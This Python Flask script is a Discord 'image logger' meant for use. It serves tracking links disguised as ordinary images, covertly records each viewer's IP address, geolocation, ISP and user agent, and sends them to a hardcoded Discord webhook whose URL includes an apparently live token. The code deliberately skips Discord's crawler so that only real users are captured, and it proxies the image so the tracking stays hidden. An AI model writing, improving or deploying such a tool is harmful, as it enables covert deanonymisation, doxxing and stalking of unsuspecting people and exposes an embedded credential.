"""
Image Logger — Discord Webhook Pinger
language: Python 3.11+, file: server.py, target: any public host (Railway, Render, VPS)

Flow:
  1. You upload an image to /register?img=<url>  →  get back a tracking URL
  2. Post the tracking URL in Discord (Discord embeds it as an image)
  3. Anyone who clicks or Discord itself previews it → request hits /img/<id>
  4. Server logs IP, geo, UA, Discord info → fires your webhook → serves the image

Run:
  pip install flask requests
  python server.py
"""

import os
import uuid
import requests
from datetime import datetime, timezone
from flask import Flask, request, redirect, Response, jsonify

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1553477510765744209/hBUBKS7Nl3xMMDmRCkZRqnEHN2tJm229z32HQgh0w5XSOW36aWJ94iE4MtknLh6Fr2tm"

# In-memory store: id -> image_url
# Swap for SQLite/Redis for persistence across restarts
image_store: dict[str, str] = {}

# IPs we've already logged this session (avoid duplicate fires on embed re-fetch)
seen_ips: set[str] = set()


def geoip(ip: str) -> dict:
    """Free tier — no key required, 45 req/min."""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query", timeout=4)
        if r.ok:
            return r.json()
    except Exception:
        pass
    return {}


def fire_webhook(tracking_id: str, img_url: str, ip: str, geo: dict, ua: str):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    country     = geo.get("country", "Unknown")
    region      = geo.get("regionName", "")
    city        = geo.get("city", "")
    isp         = geo.get("isp", "Unknown")
    location    = f"{city}, {region}, {country}".strip(", ")

    # Build Discord embed
    embed = {
        "title": "📸 Image Clicked",
        "color": 0xFF4444,
        "fields": [
            {"name": "🔗 Tracking ID", "value": f"`{tracking_id}`", "inline": True},
            {"name": "🕐 Time",         "value": now,               "inline": True},
            {"name": "🌐 IP Address",   "value": f"`{ip}`",         "inline": False},
            {"name": "🗺️ Location",     "value": location or "N/A", "inline": True},
            {"name": "📡 ISP",          "value": isp,               "inline": True},
            {"name": "🖥️ User-Agent",   "value": f"```{ua[:200]}```","inline": False},
        ],
        "thumbnail": {"url": img_url},
        "footer":    {"text": "Image Logger"},
    }

    payload = {"embeds": [embed]}
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        print(f"[webhook error] {e}")


@app.route("/register")
def register():
    """
    Register an image URL and get back a tracking link.
    Usage: GET /register?img=https://example.com/photo.jpg&host=https://yourserver.com
    """
    img_url = request.args.get("img")
    host    = request.args.get("host", request.host_url.rstrip("/"))
    if not img_url:
        return jsonify({"error": "missing ?img= param"}), 400

    tid = uuid.uuid4().hex[:10]
    image_store[tid] = img_url

    tracking_url = f"{host}/img/{tid}"
    return jsonify({
        "tracking_url": tracking_url,
        "post_this_in_discord": tracking_url,
        "original": img_url,
    })


@app.route("/img/<tid>")
def serve_image(tid: str):
    img_url = image_store.get(tid)
    if not img_url:
        return "not found", 404

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    # X-Forwarded-For can be a chain; grab the first (client) IP
    ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    # Skip Discord's own crawler (it pre-fetches embeds from their servers)
    # Remove this block if you WANT to log Discord's prefetch hits too
    skip_agents = ("Discordbot", "DiscordMediaProxy")
    if any(s in ua for s in skip_agents):
        # Still serve the image so the embed renders
        return redirect(img_url, code=302)

    # Deduplicate within session — Discord can fire multiple requests per click
    if ip not in seen_ips:
        seen_ips.add(ip)
        geo = geoip(ip)
        fire_webhook(tid, img_url, ip, geo, ua)

    # Proxy the image bytes so it renders in-client (no second redirect visible)
    try:
        r = requests.get(img_url, timeout=8, stream=True)
        content_type = r.headers.get("Content-Type", "image/jpeg")
        return Response(r.content, content_type=content_type)
    except Exception:
        return redirect(img_url, code=302)


@app.route("/list")
def list_trackers():
    """Quick dump of active tracking IDs."""
    return jsonify({tid: url for tid, url in image_store.items()})


import threading

def run_bot():
    import bot
    bot.bot.run(os.environ.get("DISCORD_TOKEN", ""))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[*] Image logger running on port {port}")
    t = threading.Thread(target=run_bot, daemon=True)
    t.start()
    app.run(host="0.0.0.0", port=port, debug=False)
